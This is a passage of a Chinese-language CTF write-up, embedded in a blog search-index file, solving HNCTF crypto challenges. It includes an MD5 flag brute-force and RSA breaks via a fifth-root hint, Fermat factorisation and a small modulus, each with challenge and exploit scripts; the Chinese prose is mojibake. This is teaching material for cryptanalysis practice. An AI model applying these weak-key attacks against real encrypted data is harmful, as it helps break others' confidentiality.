class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Dic)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                    m = <span class="string">&#x27;flag&#123;&#x27;</span> + Dic[i] + <span class="string">&#x27;00&#x27;</span>+dic[j] + <span class="string">&#x27;_P4ssw0rd_N3v3r_F0rg3t_63&#x27;</span> + num[a] + num[b] + num[c]</span><br><span class="line">                    md5 = hashlib.md5(m.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> md5 == <span class="string">&#x27;ac7f4d52c3924925aa9c8a7a1f522451&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(m , md5)</span><br></pre></td></tr></table></figure><h2 id="mathRSA"><a href="#mathRSA" class="headerlink" title="mathRSA"></a>mathRSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">hint = p**<span class="number">5</span> - q**<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943      </span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552       </span></span><br><span class="line"><span class="string">h = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ç”±é¢˜ç›®å¯çŸ¥ï¼Œn=pqï¼Œhint=p^5 - q^4,ç”±æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºéçº¿æ€§æ–¹ç¨‹ç»„</p><p>pq-n=0</p><p>p^5 - q^4-hint=0</p><p>åˆ©ç”¨sympyåº“å¯¹å…¶è§£æ–¹ç¨‹ç»„å¾—åˆ°p,qã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, p**<span class="number">5</span> - q**<span class="number">4</span> - h], [p, q])</span><br></pre></td></tr></table></figure><p>è§£å‡ºpï¼Œqåä¸€æŠŠæ¢­å°±è¡Œäº†ã€‚</p><p>æ–¹æ³•äºŒï¼š</p><p><code>hint=p**5 - q**4</code>ï¼Œå› ä¸ºhintå¾ˆå¤§ï¼Œæ‰€ä»¥<code>p**5</code>è¿œå¤§äº<code>q**4</code>ï¼Œå¯ä»¥ç›´æ¥å¯¹hintå¼€5æ¬¡æ–¹å¾—åˆ°tempï¼Œæ­¤æ—¶temp&lt;på†å¾ªç¯å–tempçš„ä¸‹ä¸€ä¸ªç´ æ•°ï¼Œç›´è‡³nå¯ä»¥æ•´é™¤tempä¸ºæ­¢,å°±èƒ½å¾—åˆ°päº†ã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552</span></span><br><span class="line">h = <span class="number">130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line">temp= gmpy2.iroot(h,<span class="number">5</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> n % temp !=<span class="number">0</span>:</span><br><span class="line">    temp =gmpy2.next_prime(temp)</span><br><span class="line">p = temp</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="pnearq"><a href="#pnearq" class="headerlink" title="pnearq"></a>pnearq</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 19421904767367129549329507820147867763064747101931314714173717122035977491291441314433180813343755107381230481007143328156292096871675328839756035726106037229325380698967544660649710464634698425387682458721466040894830503881966355435442651493212040443436714597490121865537266815247879839020846287255634123530517095030752832857842819836940083915495464712363169428825344678729929317207583197980607919720642725221740680718976635305544368542563503440076036727388062097647374046378854873864505267644315352602271587283702733779081805129429479541906613334092422428543951370065910195162721686773383508480268145903016615151713</span></span><br><span class="line"><span class="string">c = 16430654037742749931837577925393394466626615745270895225352757745284038922799868617243616416116392338428121605256850230862894296244375242336599929497221079420665154174930054597666915358687410522457846003186806053368237783147731665147575913322026626738697036282908055611350347494310666532700194563684837580022875526378181343082801716942536163583090541294011987732281942148455345223347021675781368596340860151253774597168954881987520338304516390785094435356412111780768446904948045448510663589654475221029009283144829902553888829840193614048967712676048740814622290029846433107762872806981599110271586325156855299974310</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°q = next_prime(p)ï¼Œqæ˜¯pçš„ä¸‹ä¸€ä¸ªè´¨æ•°ï¼Œè´¹é©¬åˆ†è§£Nå³å¯ã€‚ä¸€ä¸ªè´¹é©¬åˆ†è§£çš„å°è„šæœ¬ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        <span class="comment"># if verbose:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span></span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">fermat(n)</span><br></pre></td></tr></table></figure><h2 id="smallRSA"><a href="#smallRSA" class="headerlink" title="smallRSA"></a>smallRSA</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rom Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())[:<span class="number">13</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># print(f&quot;flag = &#123;flag&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line"><span class="string">c = 118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>nå¾ˆå°ï¼Œfactorçˆ†ç ´å‡ºpï¼Œqã€‚</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line">p = <span class="number">768780063730500942699787302253</span></span><br><span class="line">q = <span class="number">813910604866037851538498611597</span></span><br><span class="line">c = <span class="number">118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
            <tag> HNCTF </tag>
            
            <tag> CRYPTO </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
